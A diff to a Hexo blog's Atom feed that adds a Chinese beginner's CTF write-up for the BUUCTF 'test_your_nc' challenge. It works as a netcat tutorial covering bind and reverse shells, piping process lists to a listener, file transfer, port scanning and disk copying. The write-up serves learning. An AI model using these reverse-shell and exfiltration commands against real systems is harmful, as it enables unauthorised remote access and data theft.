@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2020-12-03T17:56:59.012Z</updated>
+  <updated>2020-12-05T05:29:58.495Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf WP</title>
+    <link href="http://example.com/2020/12/05/buupwn/"/>
+    <id>http://example.com/2020/12/05/buupwn/</id>
+    <published>2020-12-05T05:04:35.321Z</published>
+    <updated>2020-12-05T05:29:58.495Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>人生中第一道pwn</strong></p><p>test_your_nc</p><p><a href="https://i.loli.net/2020/12/05/EsnHKRjyl8CiWVA.gif">https://i.loli.net/2020/12/05/EsnHKRjyl8CiWVA.gif</a></p><p>思路:根据提示，直接NC即可</p><p>NC:的使用</p><p>nc的全名是netcat，其主要用途是建立和监听任意TCP和UDP连接，支持ipv4和ipv6。因此，它可以用来网络调试、端口扫描等等。</p><p>那么netcat怎么用呢？？？</p><pre><code>-n 以数字形式表示的IP地址-v 显示详细信息 [使用=vv获取更详细的信息-p port 本地端口-q secs 在标准输入且延迟后退出（翻译的不是很好，后面实例介绍）</code></pre><p><strong>NC远程控制</strong></p><p>这个比较有意思，我放在第一。<br>正向连接<br>A:nc -lp port -c bash<br>B:nc ip port<br>A将自己的Bash发给B<br>反向连接<br>A:nc -lp port<br>B:nc ip port -c bash<br>B将自己的Bash发给A<br>win下Bash换成cmd</p><p><a href="https://i.loli.net/2020/12/05/Ic5JZr6RhPF3s2N.png">https://i.loli.net/2020/12/05/Ic5JZr6RhPF3s2N.png</a><br><a href="https://i.loli.net/2020/12/05/fAbUJRXF21CPKgZ.png">https://i.loli.net/2020/12/05/fAbUJRXF21CPKgZ.png</a><br><a href="https://i.loli.net/2020/12/05/5EMTdkSR7G6vFZD.png">https://i.loli.net/2020/12/05/5EMTdkSR7G6vFZD.png</a></p><p><strong>使用NC进行信息收集</strong></p><p>简单的建立连接，就是侦听模式和传输模式<br>nc -l -p port监听指定端口号<br>nc -nv ip port连接对方tcp端口，默认情况下，双方可以发送文本信息<br>收集目标机上的进程信息<br>nc -l -p 4444 &gt;wing.txt将远程发送过来的内容保存在本地<br>Ps aux |nc -nv ip port -q 1 标准输入完成后delay一秒钟，会发送到侦听端</p><p><a href="https://i.loli.net/2020/12/05/Knela82oGHER3rb.png">https://i.loli.net/2020/12/05/Knela82oGHER3rb.png</a><br><a href="https://i.loli.net/2020/12/05/7sSoZM9Y5dnKXTf.png">https://i.loli.net/2020/12/05/7sSoZM9Y5dnKXTf.png</a><br><a href="https://i.loli.net/2020/12/05/y7idgqacVLJeUMp.png">https://i.loli.net/2020/12/05/y7idgqacVLJeUMp.png</a></p><p><strong>NC传输文件/目录</strong></p><p>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</p><p>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<br>ps：侦听端的文件名最好按照文件本身来命名</p><p>tar -cvf - 目录名/|nc -lp port -q 1<br>将目录打包<br>nc -nv ip port |tar -xvf -<br>将目录解包</p><p><strong>NC文件加密传输</strong></p><p>apt-get install mcrypt<br>A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名<br>B：mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1<br>理解：B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出.<br>主要是利用mcrypt进行加密<br>NC流媒体服务</p><p>A:cat wing.mp4|nc -lp port<br>B:nc -nv ip port |mplayer -vo x11 -cache 4000<br>A让wing.MP4这个文件成为流的形式发送到B，B用mplayer播放，接收多少播放多少，指定缓存4000bytes。<br>NC端口扫描</p><p>nc -nvz ip 1-65535</p><p><a href="https://i.loli.net/2020/12/05/7EgP3MK5Uyns2iO.png">https://i.loli.net/2020/12/05/7EgP3MK5Uyns2iO.png</a></p><p>默认使用tcp进行扫描<br>NC复制磁盘</p><p>A:nc -lp port |dd of=/dev/sda<br>B: dd if=/dev/sda | nc -nc ip port -q 1<br>If是input filter<br>Of 是output filter<br>B将数据复制到A挂载的硬盘上</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;人生中第一道pwn&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;test_your_nc&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://i.loli.net/2020/12/05/EsnHKRjyl8CiWVA.gif&quot;&gt;https://i.loli.net/2020</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>午夜书摘</title>
